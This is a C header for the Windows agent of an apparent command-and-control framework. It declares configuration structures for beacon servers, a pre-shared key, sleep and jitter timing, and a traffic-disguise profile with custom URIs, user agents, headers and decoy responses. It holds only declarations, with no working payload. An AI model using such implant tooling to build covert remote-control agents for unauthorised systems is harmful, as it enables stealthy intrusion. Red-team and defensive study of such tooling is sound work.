#pragma once

// Agent configuration: either patched into this binary's sentinel slot
// (WISPCFG1, shared/protocol/payload.go) or loaded from a JSON file in
// dev builds (-config path on the command line).

#include <windows.h>

typedef struct {
	char key[32];
	char value[96];
} WispHeader;

typedef struct {
	char       name[32];
	char       uris[4][96];   ULONG uriCount;
	char       method[8];
	char       uaPool[4][80]; ULONG uaCount;
	WispHeader headers[6];    ULONG headerCount;
	char       dataSlot[40];  // body | header:X | param:x
	char       respBody[512]; ULONG respStatus; char respCT[64];
	char       nfBody[256];   ULONG nfStatus;
} WispProfile;

typedef struct {
	char**  servers;      // http(s)://host:port or tcp://host:port endpoints
	ULONG   serversCount;
	char*   psk;
	ULONG   sleepMS;
	ULONG   jitterPct;
	BOOL    insecure;
	char    pluginPubkey[65]; // hex Ed25519 plugin public key (optional)
	WispProfile profile;
} WispConfig;

// Load config: sentinel slot first, then command-line -config file.
// Returns FALSE when nothing usable was found.
BOOL WispConfigLoad(WispConfig* cfg);
void WispConfigFree(WispConfig* cfg);

// base +- jitter% in ms (config/sleep.go semantics), clamped to minimum.
ULONG WispEffectiveSleep(ULONG baseMS, ULONG jitterPct);
